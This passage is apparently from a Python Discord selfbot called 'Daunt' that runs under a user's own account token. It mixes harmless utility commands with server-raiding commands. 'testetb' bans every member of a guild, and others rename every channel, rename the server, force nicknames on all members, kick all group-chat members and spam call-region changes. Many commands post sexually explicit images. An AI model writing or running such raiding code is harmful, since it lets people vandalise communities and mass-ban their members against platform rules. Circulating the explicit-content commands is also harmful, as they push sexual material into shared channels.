            content=f"`Wizzing  {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
    elif isinstance(ctx.message.channel, discord.GroupChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(f"`Wizzing  {ctx.message.channel.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing  {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")


@Daunt.command(name='8ball')
async def _ball(ctx, *, question):
    await ctx.message.delete()
    responses = [
        'That is a resounding no',
        'It is not looking likely',
        'Too hard to tell',
        'It is quite possible',
        'That is a definite yes!',
        'Maybe',
        'There is a good chance'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    await ctx.send(embed=embed)


@Daunt.command(aliases=['slots', 'bet', "slotmachine"])
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if a == b == c:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))


@Daunt.command()
async def tts(ctx, *, message):
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=discord.File(buff, f"{message}.wav"))


@Daunt.command(aliases=['gicon'])
async def guildicon(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)


@Daunt.command(aliases=['gbanner'])
async def banner(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.banner_url)
    await ctx.send(embed=em)


@Daunt.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)


@Daunt.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@Daunt.command(aliases=["roles", "groles"])
async def getroles(ctx):
    await ctx.message.delete()
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"
    print(roleStr)
    await ctx.send(roleStr)


@Daunt.command()
async def test(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    print("Banning " + str(len(users)))
    for user in users:
        try:
            print(user.id)
        except:
            pass
    await ctx.send(str(len(users)) + " users in cache")


@Daunt.command()
async def testetb(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    await ctx.send("Banning " + str(len(users)))
    for user in users:
        try:
            await ctx.guild.ban(user, reason="Daunt")
        except:
            pass


@Daunt.command(aliases=["xavier"])
async def invite(ctx):
    await ctx.message.delete()
    await ctx.send('https://discord.com/oauth2/authorize?scope=bot&client_id=705544735540117526&permissions=8')


@Daunt.command(aliases=["renameserver", "nameserver"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@Daunt.command()
async def nickall(ctx, nickname):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass


@Daunt.command()
async def youtube(ctx, *, search):
    await ctx.message.delete()
    query_string = parse.urlencode({'search_query': search})
    html_content = request.urlopen('http://www.youtube.com/results?' + query_string)
    search_results = re.findall('href=\"\\/watch\\?v=(.{11})', html_content.read().decode())
    await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])


@Daunt.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    Daunt.command_prefix = str(prefix)


@Daunt.command()
async def abc(ctx):
    await ctx.message.delete()
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u',
           'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)


@Daunt.command(aliases=["100"])
async def _100(ctx):
    await ctx.message.delete()
    message = ctx.send("Starting count to 100")
    await asyncio.sleep(2)
    for _ in range(100):
        await message.edit(content=_)
        await asyncio.sleep(2)


@Daunt.command(aliases=['bitcoin'])
async def btc(ctx):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)


@Daunt.command()
async def hastebin(ctx, *, message):
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")


@Daunt.command(pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
async def cyclenick(ctx, *, text):
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)


@Daunt.command(aliases=["stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"])
async def stopcyclenick(ctx):
    await ctx.message.delete()
    global cycling
    cycling = False


@Daunt.command()
async def acceptfriends(ctx):
    await ctx.message.delete()
    for relationship in Daunt.user.relationships:
        if relationship == discord.RelationshipType.incoming_request:
            await relationship.accept()


@Daunt.command()
async def ignorefriends(ctx):
    await ctx.message.delete()
    for relationship in Daunt.user.relationships:
        if relationship is discord.RelationshipType.incoming_request:
            relationship.delete()


@Daunt.command()
async def delfriends(ctx):
    await ctx.message.delete()
    for relationship in Daunt.user.relationships:
        if relationship is discord.RelationshipType.friend:
            await relationship.delete()



@Daunt.command(aliases=["changeregions", "changeregion", "regionschange"])
async def regionchange(ctx, amount: int):
    await ctx.message.delete()
    if isinstance(ctx.channel, discord.GroupChannel):
        token = config.get('token')
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }
        indian_payload = {'region': 'japan'}
        brazil_payload = {'region': 'brazil'}
        japan_payload = {'region': 'japan'}
        russian_payload = {'region': 'russia'}
        for _i in range(amount):
            requests.patch(f'https://discord.com/api/v8/channels/{ctx.channel.id}/call', json=indian_payload,headers=headers)
            await asyncio.sleep(3)
            requests.patch(f'https://discord.com/api/v8/channels/{ctx.channel.id}/call', json=brazil_payload,headers=headers)
            await asyncio.sleep(3)
            requests.patch(f'https://discord.com/api/v8/channels/{ctx.channel.id}/call', json=japan_payload,headers=headers)
            await asyncio.sleep(3)
            r = requests.patch(f'https://discord.com/api/v8/channels/{ctx.channel.id}/call', json=russian_payload,headers=headers).text
            await asyncio.sleep(3)
            print(r)


@Daunt.command()
async def kickgc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        for recipient in ctx.message.channel.recipients:
            await ctx.message.channel.remove_recipients(recipient)


@Daunt.command(aliases=["gcleave"])
async def leavegc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.message.channel.leave()


@Daunt.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)


@Daunt.command()
async def dog(ctx):
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    link = str(r['message'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_dog.png"))
    except:
        await ctx.send(link)


@Daunt.command()
async def cat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.thecatapi.com/v1/images/search").json()
    link = str(r[0]["url"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_cat.png"))
    except:
        await ctx.send(link)


@Daunt.command()
async def sadcat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/sadcat").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_sadcat.png"))
    except:
        await ctx.send(link)


@Daunt.command()
async def bird(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/birb").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_bird.png"))
    except:
        await ctx.send(link)


@Daunt.command()
async def fox(ctx):
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    link = str(r["image"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_fox.png"))
    except:
        await ctx.send(link)


@Daunt.command()
async def anal(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_anal.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Daunt.command()
async def erofeet(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/erofeet")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_erofeet.png"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Daunt.command()
async def feet(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_feet.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Daunt.command()
async def hentai(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_hentai.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Daunt.command()
async def boobs(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_boobs.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Daunt.command()
async def tits(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_tits.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Daunt.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_blowjob.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Daunt.command(aliases=["neko"])
async def lewdneko(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_neko.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Daunt.command()
async def lesbian(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_lesbian.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Daunt.command()
async def cumslut(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_cumslut.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Daunt.command(aliases=["vagina"])
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_pussy.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Daunt.command()
async def waifu(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/waifu")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_waifu.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)



@Daunt.command()
async def runtime(ctx):
    await ctx.message.delete()
    now = datetime.utcnow()
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)

    if days:
        time_format = "**{d}** days, **{h}** hours, **{m}** minutes, and **{s}** seconds."
    else:
        time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."
    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
    embed=discord.Embed(title="", description=(uptime_stamp), color=0x2f3136)
    embed.set_footer(text="»  daunt  » Selfbot Runtime", icon_url="https://i.vgy.me/aA2N2j.png")
    await ctx.send(embed=embed, delete_after=4)


@Daunt.command(aliases=["pr" , "prune"])
async def purge(ctx, amount: int = None):
    await ctx.message.delete()
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(lambda m: m.author == Daunt.user).map(
                lambda m: m):
            try:
                await message.delete()

            except:
                pass
    else:
        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Daunt.user).map(
                lambda m: m):
            try:

                await message.delete()

            except:
                
                pass

@Daunt.command()
async def socials(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0x2f3136)
    embed.add_field(name="Twitter", value="@deemosrevenge", inline=True)
    embed.add_field(name="Discord", value="dauntless#0001", inline=True)
    embed.add_field(name="Telegram", value="daunt", inline=True)
    await ctx.send(embed=embed)



@Daunt.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await Daunt.change_presence(activity=stream)


@Daunt.command(alises=["game"])
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Daunt.change_presence(activity=game)


@Daunt.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.message.delete()
    await Daunt.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))


@Daunt.command(aliases=["watch"])
async def watching(ctx, *, message):
    await ctx.message.delete()
    await Daunt.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
        ))


@Daunt.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.message.delete()
    await Daunt.change_presence(activity=None, status=discord.Status.dnd)



@Daunt.command(name='rolecolor')
async def _role_hexcode(ctx, *, role: discord.Role):
    await ctx.message.delete()
    await ctx.send(f"{role.name} : {role.color}")


@Daunt.command(name='clean')
async def empty(ctx):
    await ctx.message.delete()
    await ctx.send(chr(173))


@Daunt.command(aliases=["panic"])
async def shutdown(ctx):
    await ctx.message.delete()
    await Daunt.logout()


@Daunt.command(aliases=["nitrogen"])
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())


if __name__ == '__main__':
    Init()
